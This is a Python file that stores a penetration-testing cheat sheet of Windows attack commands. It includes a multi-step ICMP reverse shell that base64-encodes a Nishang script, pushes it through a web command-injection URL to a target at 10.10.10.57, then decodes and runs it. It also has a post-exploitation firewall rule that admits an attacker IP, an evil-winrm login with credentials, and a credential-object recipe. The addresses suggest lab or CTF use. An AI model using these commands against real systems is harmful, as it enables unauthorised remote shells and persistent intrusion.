class Cheat:
	def __init__(self, name):
		self.name = name
		self.category = None
		self.output = None
		self.addToList()

	def addToList(self):
		global cheatList
		cheatList.append(self)


cheatList = []

######################################
######################################

PSCredential = Cheat("PSCredential")
PSCredential.category = "Windows"
PSCredential.output = """[*] Create a Credential Object for PowerShell:

$user = 'hostname\\user'
$pw = 'password'
$secure_pw = ConvertTo-SecureString $pw -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user, $secure_pw
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
"""

######################################
######################################

icmp_reverse_shell_windows = Cheat("ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)")
icmp_reverse_shell_windows.category = "Windows"
icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.

# 1 - Download Nishang
# 2 - Remove all blank lines and commented lines for no bugs
# 3 - Convert reverseShell File => bytes => base64
# 4 - Convert "+" and "=" symboles into "%2B" and "%3D" respectively (prevents UrlEncode errors)
# 5 - Split the long String (in base64) to small lines (80 chars) for not excede url capacity
# 6 - Send file splitted in multiples part to the target
# 7 - Decode the new file in target machine AND execute

# - 2 on kali
cat IP_icmp.ps1 | sed '/^\s*$/d' > new_IP_icmp.ps1

# - 3 on kali
pwsh
$fileContent = Get-Content -Raw ./new_IP_icmp.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
$encoded = [Convert]::ToBase64String($bytes)
$encoded | Out-File new_IP_icmp.ps1.b64
exit

# - 4 on kali
cat new_IP_icmp.ps1.b64 | sed 's/+/%2B/g' | sed 's/=/%3D/g'

# - 5 on kali
fold -w 80 new_IP_icmp.ps1.b64 > final_IP_icmp.ps1.b64

# - 6 on kali
for line in $(cat icmp.ps1.b64); do cmd="echo ${line} >> C:\Temp\shell.ps1"; curl -s -X GET -G "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$cmd"; done

# - 7 on target machine
$file = Get-Content -Raw C:\Temp\shell.ps1
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
$decoded > C:\Temp\pwned.ps1
powershell C:\Temp\pwned.ps1
"""

######################################
######################################

check_priv_file = Cheat("Check Privilege of a file")
check_priv_file.category = "Windows"
check_priv_file.output = """[*] Check Privilege of a file like ls -lArth in Linux.
cacls C:\PATH\File.ext
"""

######################################
######################################

alternative_data_streams = Cheat("Alternate Data Streams (MetaData), hide file in a file")
alternative_data_streams.category = "Windows"
alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)

# List all available data streams
Get-Item -Path C:\Temp\\backup.zip -stream *

# (Stdout)	    FileName: C:\Temp\backup.zip
# (Stdout)	
# (Stdout)	 Stream                   Length    
# (Stdout)	 ------                   ------
# (Stdout)	 :$DATA                   103297
# (Stdout)	 pass                         34

# Extract the data
type C:\Temp\\backup.zip:pass
"""

######################################
######################################

firewall_rules_change_to_accept_IP_Attacker = Cheat("Firewall Rules - PostExploit - Add Allowed IP Address")
firewall_rules_change_to_accept_IP_Attacker.category = "Windows - PosExploit"
firewall_rules_change_to_accept_IP_Attacker.output = """[*] Add an IP to target firewall rules to accept traffic from UDP and TCP (Need administrator privileges)

New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.53 -Direction inbound -Action Allow
"""

######################################
######################################

evil_winrm = Cheat("Evil-winrm - (Web Service Management Protocol WS-Management) ")
evil_winrm.category = "Windows"
evil_winrm.output = """[*] Evil-winrm - Automated tool to bind stable shell when WS-Management Protocol is active an open and we have correct credentials

evil-winrm -i 10.10.10.57 -u 'administrator' -p '1234test'
"""
